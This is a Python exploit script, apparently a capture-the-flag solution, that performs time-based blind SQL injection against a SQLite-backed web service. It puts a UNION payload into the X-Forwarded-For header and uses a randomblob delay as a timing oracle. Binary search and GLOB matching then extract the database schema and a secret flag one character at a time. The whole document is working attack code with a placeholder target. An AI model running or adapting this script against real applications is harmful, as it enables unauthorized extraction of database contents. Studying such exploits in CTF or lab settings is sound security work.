import requests
import string
import time
import re

TARGET = "http://localhost:6008" # CHANGE THIS

def oracle(condition):
    payload = "' UNION SELECT * FROM (SELECT CASE WHEN (%s) THEN randomblob(100000000/3) ELSE 4 END ip) JOIN (SELECT DATETIME('NOW'))-- " % condition
    start = time.time()
    requests.post(TARGET, headers={"X-Forwarded-For": payload})
    return time.time() - start > 1

def solve(query):
    response = ""
    max_len = 1
    min_len = 0

    # find max and min length
    while True:
        condition = "LENGTH((%s))<%d" % (query, max_len)
        if oracle(condition):
            max_len = max_len-1
            break
        else:
            min_len = max_len
            max_len *= 2
        if max_len > 1024:
            print("error finding length")
            exit()

    # find response length
    while max_len != min_len:
        check_len = (min_len+max_len)//2
        condition = "LENGTH((%s))>%d" % (query, check_len)
        if oracle(condition):
            min_len = check_len+1
        else:
            max_len = check_len
    print("LENGTH FOUND: " + str(max_len))

    for i in range(max_len):
        for c in string.printable:
            if c in "[]?*":
                c = "[" + c + "]"
            condition = "(%s) GLOB '%s*'" % (query, response+c)
            try:
                if oracle(condition):
                    response += c
                    break
            except:
                pass
        if len(response) == i:
            response += "?"
        print(re.sub(r'\[(.)\]', r'\1', response))
    return re.sub(r'\[(.)\]', r'\1', response)

# allows us to find the table where the flag is:
solve("SELECT group_concat(sql) from sqlite_master")
# get flag:
print("FLAG:", solve("SELECT flag FROM `s3cr%t_fl4g_is_h3re`"))